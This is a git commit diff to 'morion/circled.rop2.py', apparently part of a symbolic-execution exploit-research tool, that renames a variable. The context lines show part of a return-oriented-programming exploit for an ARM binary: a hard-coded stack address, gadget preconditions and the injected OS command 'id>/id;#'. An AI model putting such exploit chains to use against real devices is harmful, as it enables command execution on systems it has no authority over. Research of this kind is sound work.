c9a3cce1420be0a7037b332202a83f5ef64938b9
Damian Pfammatter <pfammatter.damian@gmail.com>
2024-04-10 15:02:33 +0200

    Variable renaming

--- morion/circled.rop2.py
+++ morion/circled.rop2.py
@@ -10,15 +10,15 @@ ast = ast
 # OS command
 md5_sum_len = 32
 cmd         = "id>/id;#"
-cmd_ptr     = 0xbeffc104+396
+cmd_addr    = 0xbeffc104+396
 
 # Preconditions gadget 0
 g0_sp_val  = ctx.getConcreteRegisterValue(ctx.registers.sp)-9*4
 g0_pc_ast  = ctx.getMemoryAst(MemoryAccess(g0_sp_val+8*4, 4))
 g0_pc_val  = 0xc9b8
 g0_r6_ast  = ctx.getMemoryAst(MemoryAccess(g0_sp_val+2*4, 4))
-g0_r6_val  = cmd_ptr
-g0__r6_ast = ctx.getMemoryAst(MemoryAccess(cmd_ptr, 16))
+g0_r6_val  = cmd_addr
+g0__r6_ast = ctx.getMemoryAst(MemoryAccess(cmd_addr, 16))
 g0__r6_val = int.from_bytes(bytes(cmd, "UTF-8"), byteorder="little")
 
 # Solve preconditions
